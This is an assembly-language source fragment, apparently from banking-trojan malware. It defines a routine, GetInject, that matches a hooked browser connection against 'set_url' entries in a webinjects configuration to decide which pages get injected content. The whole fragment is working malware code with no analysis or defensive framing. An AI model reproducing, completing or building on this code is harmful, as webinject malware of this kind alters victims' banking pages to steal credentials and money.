
.code

;; ==================================================================================================== ;;
;; GetInject -                                                                                          ;;
;; __in dwHandle - stored connection handle                                                             ;;
;; __in lpInjPtr - pointer in webinjects data search from                                               ;;
;; Return:  0 - failed                                                                                  ;;
;;         !0 - success                                                                                 ;;
;;              eax - pointer to options                                                                ;;
;;              ecx - len of options                                                                    ;;
;; ==================================================================================================== ;;
GetInject proc uses edx edi esi dwHandle, lpInjPtr : dword

	invokx  &ArrayKeyPos[ebx], lpSendBuffersArray[ebx], dwHandle
	jmpz eax, @ret		;; no stored connections for this handle
	mov  edx, [eax+4]	;; ptr to connection brief


	mov  esi, lpWebInjectsData[ebx]
	lodsd
	mov  edi, lpInjPtr
	jmpnz edi, @F
	mov  edi, esi
@@:	add  esi, eax		;; end ptr


@nextseturl:
	mov  eax, esi
	sub  eax, edi		;; len
	invokx  &StrIPos[ebx], edi, eax, "\nset_url ", 9
	jmpz eax, @ret
	lea  edi, [eax+9]	;; url mask ptr


	mov  eax, esi
	sub  eax, edi		;; len
	invokx  &Compare[ebx], edx, edi, eax
	jmpz eax, @nextseturl

@ret:
	ret
GetInject endp

